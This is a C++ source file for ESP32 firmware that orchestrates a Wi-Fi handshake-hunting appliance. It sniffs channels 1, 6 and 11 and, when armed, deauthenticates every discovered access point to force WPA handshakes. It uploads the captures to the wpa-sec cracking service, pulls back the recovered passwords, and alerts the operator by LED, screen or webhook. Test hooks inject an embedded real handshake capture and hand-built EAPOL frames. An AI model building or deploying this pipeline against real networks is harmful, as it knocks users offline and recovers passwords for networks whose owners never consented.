/**
 * @file hunt_loop.cpp
 * @brief The shipped hunt→enqueue→drain→upload loop (ADR-0017 decision #8). Device-only.
 */
#include "hunt_loop.h"

#ifndef UNIT_TEST

#include <Arduino.h>

#include <cstring>
#include <new>

#include "config/active_board.h"
#include "core/deadline.h"  // reached(): wrap-safe deadline test, shared with the deauth heartbeat.
#include "core/event_bus.h"
#include "net/ap_registry.h"
#include "net/capture_queue.h"
#include "net/capture_store_littlefs.h"
#include "net/cracked_fetcher_wpasec.h"
#include "net/cracked_manifest.h"
#include "net/cracked_store_littlefs.h"
#include "net/cracked_sync.h"
#include "net/hunt_engine.h"
#include "net/radio_sniffer_esp32.h"
#include "net/raw_transmitter_esp32.h"
#include "net/station_control_esp32.h"
#include "net/sync_scheduler.h"
#include "net/sync_session.h"
#include "net/uploader_wpasec.h"
#include "surface/led_driver_esp32.h"
#include "surface/led_status_surface.h"
#include "surface/screen_renderer_esp32.h"
#include "surface/screen_toast_surface.h"
#include "surface/webhook_notifier.h"
#include "surface/webhook_transport_esp32.h"

#ifdef SAPPER_TEST_HOOKS
// The operator's real handshake pcap, embedded by embed_test_pcap.py (empty when none is given). At
// global scope so its own `namespace sapper` lands correctly; included only in test-hooks builds.
#include "gen/wpasec_test_pcap.h"
#endif

namespace sapper {
namespace {

// The shipped sweep: the three non-overlapping 2.4 GHz channels most APs sit on, so a cycle is quick
// and covers the common case. A fuller 1-13 sweep is a later tuning decision (LEDGER), not a floor.
uint8_t g_hopChannels[3] = {1, 6, 11};

// The spine, file-scope so it lives for the device's whole run. Order matters: the relay is built
// before the engine (which observes it) and the supervisor (which the relay targets), resolving the
// construction cycle CaptureReadyRelay exists for.
Esp32RadioSniffer g_sniffer;
ApRegistry g_registry;
CaptureReadyRelay g_relay;
// The raw-TX seam (ADR-0029): ships in every binary but is injected into the engine only when the
// operator armed deauth, so a disarmed device holds it inert. The engine is placement-new'd in
// huntLoopBegin once the arm state is known from NVS, matching the file's other runtime singletons.
Esp32RawTransmitter g_rawTx;
alignas(HuntEngine) uint8_t g_engineStorage[sizeof(HuntEngine)];
HuntEngine* g_engine = nullptr;
LittleFsCaptureStore g_store;
CaptureQueue g_queue(g_store);
WpaSecUploader g_uploader;

// The cracked-results sync half of the loop (slice-0020, ADR-0019): the account mirror on LittleFS, the
// pure per-BSSID manifest over it, the pinned-TLS download seam, the hourly cadence, and the headless
// Serial "surface" that reports each sync. The manifest and the sync each hold a ~27KB fixed buffer at
// file scope (the RAM the LEDGER's bound item tracks); comparable to the upload path's pcap buffers.
LittleFsCrackedStore g_crackedStore;
CrackedManifest g_manifest(g_crackedStore);
WpaSecCrackedFetcher g_fetcher;
SyncScheduler g_scheduler;

// The surface event bus (ADR-0021): the sync publishes cracked facts and the supervisor publishes drain
// facts onto it; the two sinks below subscribe. This is the single mechanism ADR-0001 always intended,
// realised now that slice-7 has more than one surface reacting to the same facts.
EventBus g_bus;

// The headless diagnostic sink: logs each sync outcome and every new/changed crack to Serial and holds
// the latest outcome + a monotonic count for a device surface / the on-air verify to read. It NEVER logs
// the plaintext password: the recovered PSK is a secret at rest (ADR-0006) and a verify artifact is
// committed as evidence (ADR-0004), so it prints only essid, BSSID, and password length — the PSK lives
// in the manifest for the real surfaces to read through the seam (§4 invariant #12). This log is
// diagnostic; the operator's LED alert channel is g_ledSurface below. It ignores the drain facts (the
// LED consumes those), keeping its output the exact [SYNC]/[CRACK] lines the sync verify greps for.
class SerialEventLogger : public EventSink {
public:
    void onAppEvent(const AppEvent& e) override {
        switch (e.type) {
            case AppEventType::NewPassword: {
                const CrackedResult& r = *e.password;
                Serial.printf("[CRACK] recovered essid='%s' bssid=%02x:%02x:%02x:%02x:%02x:%02x pwlen=%u\n",
                              r.essid, r.bssid[0], r.bssid[1], r.bssid[2], r.bssid[3], r.bssid[4],
                              r.bssid[5], static_cast<unsigned>(std::strlen(r.password)));
                break;
            }
            case AppEventType::FirstSyncSummary:
                Serial.printf("[SYNC] first-sync summary imported=%u (seeded silently, not alerted)\n",
                              static_cast<unsigned>(e.importedCount));
                break;
            case AppEventType::SyncCompleted: {
                const SyncOutcome& o = *e.sync;
                last_ = o;
                ++count_;
                Serial.printf("[SYNC] outcome ok=%d first=%d downloaded=%u new=%u malformed=%u overflow=%u "
                              "storeError=%d fetch=%d\n", o.ok, o.firstSync,
                              static_cast<unsigned>(o.downloaded), static_cast<unsigned>(o.newPasswords),
                              static_cast<unsigned>(o.malformed), static_cast<unsigned>(o.overflow),
                              o.storeError, static_cast<int>(o.fetch));
                break;
            }
            case AppEventType::HandshakeCaptured: {
                // The headless capture record — the one thing missing when a capture "went unnoticed"
                // (ADR-0031). Identity only (no PSK; a capture has none), and the anchor the on-air
                // capture-notify verify greps for.
                const CaptureFact& c = *e.capture;
                Serial.printf("[CAPTURE] essid='%s' bssid=%02x:%02x:%02x:%02x:%02x:%02x\n", c.ssid,
                              c.bssid[0], c.bssid[1], c.bssid[2], c.bssid[3], c.bssid[4], c.bssid[5]);
                break;
            }
            case AppEventType::DrainStarted:
            case AppEventType::DrainCompleted:
                break;  // the LED surface consumes drain facts; this logger stays sync-only.
        }
    }
    const SyncOutcome& last() const { return last_; }
    uint32_t count() const { return count_; }

private:
    SyncOutcome last_;
    uint32_t count_ = 0;
};

SerialEventLogger g_syncLogger;

// The first real alert surface (slice-0022, ADR-0021): the status LED. Subscribes to the bus and drives
// the active board's LED through the Esp32 driver behind the LedDriver seam.
Esp32LedDriver g_ledDriver(kActiveBoard);
LedStatusSurface g_ledSurface(g_ledDriver);

// The push-notification surface (slice-0024, ADR-0023): a transmitting surface. It subscribes to the
// bus like the LED, but POSTs inside an STA window (it is set on the supervisor as its WindowNotifier),
// so a recovered password reaches the operator's phone via ntfy/Discord. Enabled only when a usable
// webhook URL is provisioned; the transport is a WS-client-secure POST verified against the system CA
// bundle. Placement-new'd once the URL is known (it binds the URL + transport by reference), like the
// station adapter and supervisor below.
Esp32WebhookTransport g_webhookTransport;
alignas(WebhookNotifier) uint8_t g_webhookStorage[sizeof(WebhookNotifier)];
WebhookNotifier* g_webhook = nullptr;

// The status-HUD + cracked-toast display surface (slice-0026, ADR-0025): a passive surface like the
// LED, but it renders engine facts as text on the panel. Wired only when huntLoopBegin is given a
// display and the active board has one; the renderer binds the display by reference and the surface
// binds the renderer by reference, so both are placement-new'd once the display is known.
alignas(Esp32ScreenRenderer) uint8_t g_screenRendererStorage[sizeof(Esp32ScreenRenderer)];
alignas(ScreenToastSurface) uint8_t g_screenStorage[sizeof(ScreenToastSurface)];
Esp32ScreenRenderer* g_screenRenderer = nullptr;
ScreenToastSurface* g_screen = nullptr;

// CrackedSync and the session bind to the wpa-sec key, so they are placement-new'd once credentials are
// known, exactly as the station adapter and supervisor are.
alignas(CrackedSync) uint8_t g_syncStorage[sizeof(CrackedSync)];
alignas(ScheduledSyncSession) uint8_t g_sessionStorage[sizeof(ScheduledSyncSession)];
CrackedSync* g_sync = nullptr;
ScheduledSyncSession* g_session = nullptr;

// Our own copy of the credentials, at file scope so the station adapter's ssid/pass pointers and the
// supervisor's key pointer stay valid for the device's whole run. Copying here (rather than holding
// the caller's ProvisioningRecord) means a caller may pass a stack temporary safely — the earlier
// design, which held the caller's pointers, dangled when the verify probe passed a local record.
ProvisioningRecord g_creds;

// Constructed in huntLoopBegin() once credentials are known: the station adapter needs the SSID/pass,
// the supervisor the wpa-sec key. Placement-new into aligned storage keeps them at file scope without
// a heap allocation or a default-constructible requirement on types that hold references.
alignas(Esp32StationControl) uint8_t g_stationStorage[sizeof(Esp32StationControl)];
alignas(UploadSupervisor) uint8_t g_supervisorStorage[sizeof(UploadSupervisor)];
Esp32StationControl* g_station = nullptr;
UploadSupervisor* g_supervisor = nullptr;
bool g_running = false;

// Deauth arm state + heartbeat (ADR-0029): when armed, log the engine's deauth TX counts every 2s so
// a surface and the on-air verify can see a shipped binary transmitting during its hunt.
constexpr uint32_t kDeauthHeartbeatMs = 2000;
bool g_deauthArmed = false;
uint32_t g_deauthHbDueMs = 0;

#ifdef SAPPER_TEST_HOOKS
// A synthetic wpa-sec-valid handshake (beacon + M1 + M2) for the on-air verify's stimulus, built with
// the same minimal frames the native tests use so serializeHandshake emits a well-formed pcap. It is
// not a crackable capture, so the live service classifies it — the verify proves the TLS/POST/parse
// path, not a crack (slice-0018 Scenario G).
const uint8_t kStimulusBssid[6] = {0x02, 0x53, 0x41, 0x50, 0x50, 0x52};
const uint8_t kStimulusClient[6] = {0x06, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E};

// pcap on-the-wire is little-endian (kPcapMagicMicroseconds). Read the fields we need directly.
uint16_t readLe16(const uint8_t* p) { return static_cast<uint16_t>(p[0] | (p[1] << 8)); }
uint32_t readLe32(const uint8_t* p) {
    return static_cast<uint32_t>(p[0]) | (static_cast<uint32_t>(p[1]) << 8) |
           (static_cast<uint32_t>(p[2]) << 16) | (static_cast<uint32_t>(p[3]) << 24);
}

void appendEapol(uint8_t* frame, uint16_t& len, const uint8_t bssid[6], const uint8_t client[6],
                 uint16_t keyInfo, bool fromAp) {
    uint8_t* p = frame;
    std::memset(p, 0, 24);
    p[0] = 0x08;                    // data frame.
    p[1] = fromAp ? 0x02 : 0x01;   // From-DS / To-DS.
    if (fromAp) {
        std::memcpy(&p[4], client, 6);
        std::memcpy(&p[10], bssid, 6);
    } else {
        std::memcpy(&p[4], bssid, 6);
        std::memcpy(&p[10], client, 6);
    }
    std::memcpy(&p[16], bssid, 6);
    const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
    std::memcpy(&p[24], snap, 8);
    uint8_t* eapol = &p[32];
    std::memset(eapol, 0, 99);
    eapol[0] = 0x02;                                  // EAPOL version.
    eapol[1] = 0x03;                                  // EAPOL-Key.
    eapol[3] = 95;                                    // body length.
    eapol[4] = 0x02;                                  // WPA2 key descriptor.
    eapol[5] = static_cast<uint8_t>(keyInfo >> 8);
    eapol[6] = static_cast<uint8_t>(keyInfo & 0xFF);
    len = 32 + 99;
}
#endif  // SAPPER_TEST_HOOKS

}  // namespace

bool huntLoopBegin(const ProvisioningRecord& creds, const UploadSupervisorConfig& config,
                   IDisplay* display) {
    if (!g_store.begin()) {
        Serial.println("[FATAL] capture store (LittleFS) mount failed");
        return false;
    }
    if (!g_crackedStore.begin()) {
        Serial.println("[FATAL] cracked store (LittleFS) mount failed");
        return false;
    }
    // Load the account mirror into the manifest now, at boot, so the first sync's fresh-vs-known decision
    // reflects flash, not an empty map. A real load failure is fatal (fail loud, §3); a *missing* file is
    // success (a fresh, empty manifest — the first-boot state), so this only trips on genuine corruption.
    if (!g_manifest.begin()) {
        Serial.println("[FATAL] cracked manifest load failed");
        return false;
    }
    // Wire the surfaces onto the bus before anything can publish. A failed subscription is a boot-time
    // wiring bug (too many surfaces for the bus capacity) and is fatal — never a silently missing
    // surface (ADR-0021, quality bar §3).
    if (!g_bus.subscribe(g_syncLogger) || !g_bus.subscribe(g_ledSurface)) {
        Serial.println("[FATAL] event bus subscription failed (too many surfaces)");
        return false;
    }

    g_creds = creds;  // own the credentials so the adapter/supervisor pointers never dangle.
    // Arm the engine iff the operator armed deauth in NVS (ADR-0029, default-off). Disarmed injects a
    // null transmitter -> the pre-0029 passive hunt. Built before the supervisor, which holds it by ref.
    g_deauthArmed = g_creds.deauthEnabled;
    g_engine = new (g_engineStorage)
        HuntEngine(g_sniffer, g_registry, g_relay, g_hopChannels, 3, HuntConfig{},
                   g_deauthArmed ? &g_rawTx : nullptr);
    g_station = new (g_stationStorage) Esp32StationControl(g_creds.ssid, g_creds.pass);
    g_sync = new (g_syncStorage) CrackedSync(g_fetcher, g_manifest, g_creds.key, g_bus);
    g_session = new (g_sessionStorage) ScheduledSyncSession(g_scheduler, *g_sync);
    g_supervisor = new (g_supervisorStorage)
        UploadSupervisor(*g_engine, g_queue, g_uploader, *g_station, g_creds.key, config, g_session, &g_bus);
    g_relay.setTarget(*g_supervisor);

    // Wire the push-notification surface iff a usable webhook URL is provisioned (ADR-0023). A bad or
    // absent URL disables push loudly and never blocks the hunt — the webhook is optional. When enabled,
    // it subscribes to the bus (fatal if the bus is full, like the other surfaces) and is set as the
    // supervisor's WindowNotifier so it transmits inside each STA window.
    if (isUsableWebhookUrl(g_creds.webhookUrl)) {
        g_webhook = new (g_webhookStorage) WebhookNotifier(g_creds.webhookUrl, g_webhookTransport);
        if (!g_bus.subscribe(*g_webhook)) {
            Serial.println("[FATAL] event bus subscription failed (webhook surface)");
            return false;
        }
        g_supervisor->setNotifier(*g_webhook);
        Serial.println("[WEBHOOK] enabled (push on new password)");
    } else {
        Serial.println("[WEBHOOK] disabled (no/invalid webhook url)");
    }

    // Wire the status-HUD/toast surface iff a display was passed and the active board has a panel
    // (ADR-0025). A passive surface like the LED: it subscribes to the bus and renders on its own tick.
    // A screenless board or a null display leaves it off — the screen is optional, like the webhook.
    if (display != nullptr && kActiveBoard.hasDisplay) {
        g_screenRenderer = new (g_screenRendererStorage) Esp32ScreenRenderer(*display);
        g_screen = new (g_screenStorage) ScreenToastSurface(*g_screenRenderer);
        if (!g_bus.subscribe(*g_screen)) {
            Serial.println("[FATAL] event bus subscription failed (screen surface)");
            return false;
        }
        Serial.println("[SCREEN] enabled (status HUD + cracked toast)");
    } else {
        Serial.println("[SCREEN] disabled (no display)");
    }

    if (!g_engine->begin(millis())) {
        Serial.println("[FATAL] hunt engine could not begin (promiscuous mode failed)");
        return false;
    }
    // Announce the arm state (ADR-0029): a shipped, armed appliance deauths every AP it discovers.
    Serial.println(g_deauthArmed
        ? "[DEAUTH] ARMED - deauthing discovered APs to force handshakes (authorized use only)"
        : "[DEAUTH] disarmed - passive hunt (arm via the provisioning portal)");
    g_supervisor->begin(millis());  // also seeds the hourly sync cadence (SyncSession::begin).
    g_ledDriver.begin();            // configure the LED GPIO now the Arduino core is up.
    g_ledSurface.begin(millis());   // light the LED in its hunting heartbeat.
    if (g_screen != nullptr) g_screen->begin(millis());  // draw the initial HUD on the panel.
    g_running = true;
    Serial.println("[HUNT] discovering channels=1,6,11 (shipped hunt+upload+sync loop)");
    return true;
}

void huntLoopPump() {
    if (!g_running) return;
    const uint32_t now = millis();
    g_engine->tick(now);
    g_supervisor->tick(now);   // publishes DrainStarted/DrainCompleted (and runs a due sync) onto the bus.
    g_ledSurface.tick(now);    // after the supervisor, so a status published this iteration shows now.
    if (g_screen != nullptr) g_screen->tick(now);  // likewise: render any status change this iteration.
    // Deauth heartbeat (ADR-0029): only when armed, so a disarmed shipped binary stays silent on it.
    if (g_deauthArmed && reached(now, g_deauthHbDueMs)) {
        g_deauthHbDueMs = now + kDeauthHeartbeatMs;
        Serial.printf("[DEAUTH] txOk=%lu txFail=%lu capturing=%d\n",
                      static_cast<unsigned long>(g_engine->deauthTxOk()),
                      static_cast<unsigned long>(g_engine->deauthTxFail()),
                      g_engine->capturingBssid() != nullptr ? 1 : 0);
    }
}

const DrainOutcome& huntLoopLastDrain() {
    static DrainOutcome none;
    return g_supervisor != nullptr ? g_supervisor->lastDrain() : none;
}

uint32_t huntLoopDrainCount() { return g_supervisor != nullptr ? g_supervisor->drainCount() : 0; }

const SyncOutcome& huntLoopLastSync() { return g_syncLogger.last(); }

uint32_t huntLoopSyncCount() { return g_syncLogger.count(); }

uint32_t huntLoopWebhookSentCount() { return g_webhook != nullptr ? g_webhook->sentCount() : 0; }

#ifdef SAPPER_TEST_HOOKS
void huntLoopInjectCrackedAlert() {
    if (!g_running) return;
    // A synthetic recovered password, published on the same bus the real sync uses (§4 invariant #2).
    // The value is not persisted to the manifest — this stimulus proves the surface path (bus → LED
    // flash), not the store round-trip (Scenario J already proves that).
    CrackedResult r;
    const uint8_t bssid[6] = {0x02, 0x53, 0x41, 0x50, 0x50, 0x52};
    std::memcpy(r.bssid, bssid, 6);
    std::strncpy(r.essid, "SAPPER-VERIFY", kCrackedEssidCap - 1);
    std::strncpy(r.password, "led-verify-stimulus", kCrackedPasswordCap - 1);
    Serial.println("[LED] injecting synthetic new-password fact (verify stimulus)");
    g_bus.publish(AppEvent::newPassword(r));
}
#endif

#ifdef SAPPER_TEST_HOOKS
void huntLoopForceSyncDue() {
    if (!g_running) return;
    // begin() sets the scheduler's deadline to now, so isDue() is immediately true — the next STA window
    // runs the sync without waiting a real hour. This re-arms it even after a prior successful sync pushed
    // the deadline an hour out. Test-hooks only, so no shipped binary can force a sync (§4 invariant #4).
    g_scheduler.begin(millis());
    Serial.println("[SYNC] forced due (verify clock-advance stimulus)");
}
#endif

#ifdef SAPPER_TEST_HOOKS
namespace {

// Inject the operator's embedded real handshake (gen/wpasec_test_pcap.h). The pcap may be link type
// 105 (raw 802.11) or 127 (radiotap) — the Adversary's captures are radiotap, so strip the per-frame
// radiotap header before feeding raw 802.11 to the collector, which keeps beacon + M1..M4 for the
// target BSSID. Re-serialized and uploaded, a real handshake is what exercises accepted/duplicate.
void injectRealPcap() {
    const uint8_t* pcap = kWpaSecTestPcap;
    const size_t len = kWpaSecTestPcapLen;
    if (len < 24) {
        Serial.println("[ERROR] embedded test pcap too small");
        return;
    }
    const bool radiotap = readLe32(pcap + 20) == 127;  // network field: 127 = radiotap-prefixed.

    // Resolve one record's 802.11 body (radiotap stripped). Returns false on a truncated/short record.
    auto frameOf = [&](size_t recOff, const uint8_t*& frame, uint16_t& frameLen) -> bool {
        if (recOff + 16 > len) return false;
        const uint32_t inclLen = readLe32(pcap + recOff + 8);
        const uint8_t* pkt = pcap + recOff + 16;
        if (recOff + 16 + inclLen > len) return false;
        if (radiotap) {
            if (inclLen < 4) return false;
            const uint16_t itLen = readLe16(pkt + 2);  // radiotap it_len.
            if (itLen >= inclLen) return false;
            frame = pkt + itLen;
            frameLen = static_cast<uint16_t>(inclLen - itLen);
        } else {
            frame = pkt;
            frameLen = static_cast<uint16_t>(inclLen);
        }
        return true;
    };

    const uint8_t* first = nullptr;
    uint16_t firstLen = 0;
    if (!frameOf(24, first, firstLen) || firstLen < 24) {
        Serial.println("[ERROR] embedded test pcap has no usable first frame");
        return;
    }
    uint8_t bssid[6];
    std::memcpy(bssid, first + 16, 6);  // Addr3 = BSSID; the collector keeps only this AP's frames.
    HandshakeCollector collector(bssid, 0);

    for (size_t off = 24; off + 16 <= len;) {
        const uint32_t inclLen = readLe32(pcap + off + 8);
        // Guard the advance against a corrupt/oversized length: without this, off + 16 + inclLen can wrap
        // size_t, regress `off`, and spin the loop forever on a malformed embedded pcap (verify tooling).
        if (inclLen > len - off - 16) break;
        const uint8_t* frame = nullptr;
        uint16_t frameLen = 0;
        if (frameOf(off, frame, frameLen) && frameLen >= 24) collector.ingest(frame, frameLen);
        off += 16 + inclLen;
    }

    if (!collector.isWpaSecValid()) {
        Serial.println("[ERROR] embedded test pcap did not yield a wpa-sec-valid handshake");
        return;
    }
    const CapturedHandshake& hs = collector.handshake();
    Serial.printf("[UPLOAD] real handshake reconstructed: ssid='%s' beacon=%d M1=%d M2=%d M3=%d M4=%d\n",
                  hs.ssid, hs.hasBeacon(), hs.has(HandshakeMessage::M1), hs.has(HandshakeMessage::M2),
                  hs.has(HandshakeMessage::M3), hs.has(HandshakeMessage::M4));
    Serial.println("[UPLOAD] injecting REAL handshake (embedded pcap) through the capture-ready seam");
    g_relay.onCaptureReady(hs);
}

}  // namespace

void huntLoopInjectStimulus() {
    if (!g_running) return;
    if (kWpaSecTestPcapLen > 0) {  // an operator pcap is embedded — use it instead of the synthetic.
        injectRealPcap();
        return;
    }
    HandshakeCollector collector(kStimulusBssid, /*channel=*/1);  // matches the stimulus beacon below.

    uint8_t beacon[64];
    std::memset(beacon, 0, sizeof(beacon));
    beacon[0] = 0x80;                       // beacon.
    std::memset(&beacon[4], 0xFF, 6);       // broadcast.
    std::memcpy(&beacon[10], kStimulusBssid, 6);
    std::memcpy(&beacon[16], kStimulusBssid, 6);
    uint16_t bp = 24 + 12;                  // fixed body (timestamp/interval/capability).
    beacon[bp++] = 0x00;                    // SSID element,
    beacon[bp++] = 0x06;                    // length 6,
    std::memcpy(&beacon[bp], "SAPPER", 6);
    bp += 6;
    beacon[bp++] = 0x03;                    // DS Parameter Set,
    beacon[bp++] = 0x01;
    beacon[bp++] = 0x01;                    // channel 1.
    collector.ingest(beacon, bp);

    uint8_t frame[160];
    uint16_t len = 0;
    appendEapol(frame, len, kStimulusBssid, kStimulusClient, 0x0088, /*fromAp=*/true);   // M1 (Ack).
    collector.ingest(frame, len);
    appendEapol(frame, len, kStimulusBssid, kStimulusClient, 0x0108, /*fromAp=*/false);  // M2 (MIC).
    collector.ingest(frame, len);

    if (!collector.isWpaSecValid()) {
        Serial.println("[ERROR] stimulus handshake is not wpa-sec-valid — verify build is broken");
        return;
    }
    Serial.println("[UPLOAD] injecting stimulus handshake through the capture-ready seam");
    g_relay.onCaptureReady(collector.handshake());  // the same seam the engine calls (§4 invariant #2).
}
#endif  // SAPPER_TEST_HOOKS

}  // namespace sapper

#endif  // UNIT_TEST
